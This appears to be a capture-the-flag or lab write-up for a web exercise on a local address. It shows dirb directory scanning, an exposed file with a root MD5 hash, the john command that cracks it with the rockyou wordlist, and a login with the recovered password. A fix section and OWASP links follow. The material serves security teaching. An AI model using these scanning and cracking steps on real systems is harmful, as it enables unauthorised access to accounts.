# Hidden file

### Breach Exploit
Scan the website with dirb and we get this:

```
 ==> DIRECTORY: http://192.168.64.3/admin/
 ==> DIRECTORY: http://192.168.64.3/whatever/
```

In /whatever we find a file containing this:

```
root:437394baff5aa33daa618be47b75cb49
```

Brute force the hash with john:

```
# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt flag.txt
qwerty123@       (?)
```

Now go to /whatever and fill the form with the creds we get.

### Fix Breach

Do not let access to .htpasswd file by changing server configuration
Do not use md5
```https://wiki.owasp.org/index.php/SCG_WS_Apache```

### Documentation
```https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#public-serving-of-uploaded-content```